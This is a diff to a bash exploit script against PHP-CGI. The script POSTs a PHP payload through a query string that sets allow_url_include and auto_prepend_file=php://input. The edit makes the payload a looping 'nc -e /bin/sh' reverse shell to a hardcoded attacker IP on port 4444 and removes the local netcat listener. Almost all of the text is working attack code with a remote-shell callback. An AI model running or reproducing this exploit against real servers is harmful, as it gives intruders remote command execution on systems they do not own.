@@ -17,11 +17,9 @@ rhost=$1
 lhost=$(hostname -I)
 
 exploit() {
-    payload="<?php system('nc -e /bin/sh $lhost 4444'); die(); ?>"
+    payload="<?php system('while :; do sleep 1; nc -e /bin/sh 192.168.159.165 4444; done'); die(); ?>"
 
-    sleep 1 &
-    curl -s -X POST "$rhost/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "$payload" --connect-timeout 0 &
-    nc -lp 4444 -v
+    curl -s -X POST "$rhost/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "$payload" --connect-timeout 0
     
     if [ $? -ne 0 ]; then
         echo "[!] Exploit failed!"
